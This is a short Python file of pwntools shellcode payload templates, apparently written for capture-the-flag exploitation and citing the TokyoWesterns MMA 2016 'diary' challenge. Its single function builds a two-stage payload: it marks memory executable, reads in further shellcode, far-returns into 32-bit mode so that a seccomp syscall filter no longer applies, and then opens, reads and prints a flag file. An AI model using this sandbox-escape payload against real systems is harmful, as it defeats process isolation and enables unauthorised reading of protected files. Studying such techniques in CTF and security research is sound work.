#coding:utf-8

'''
some payload templates for shellcode
'''

def bypass_seccomp():
    """
    switch from 64-bit to 32-bit to bypass seccomp
    challenge: TW 2016 MMA diary
    wp: https://uaf.io/exploitation/2016/09/06/TokyoWesterns-MMA-Diary.html
    note that after switch to 32bit you should use open, read and write
    syscall to print the flag instead of execve("/bin/sh")
    """
    template = ("""p1 = asm(shellcraft.amd64.mprotect(BSS, LEN, 7), arch='amd64')+\\
asm(shellcraft.amd64.read(0, SHELLCODE_ADDR, 0x100), arch='amd64') + \\
asm('''xor rsp, rsp
mov esp, 0x602400
mov DWORD PTR [esp+4], 0x23
mov DWORD PTR [esp], 0x602800
retf''', arch='amd64')
""")

    template += ("""context.bits = 32 # if context.bits=64, then use shellcraft to generate 32-bit
# shellcode will fail
p2 = asm(shellcraft.i386.open("/flag", 0x80000, 0), arch='x86') # fopen("/flag", "r")
p2 += asm(shellcraft.i386.read('eax', BUF_ADDR, FLAG_LEN), arch='x86')
p2 += asm(shellcraft.i386.write(1, BUF_ADDR, FLAG_LEN), arch='x86')
""")

    return template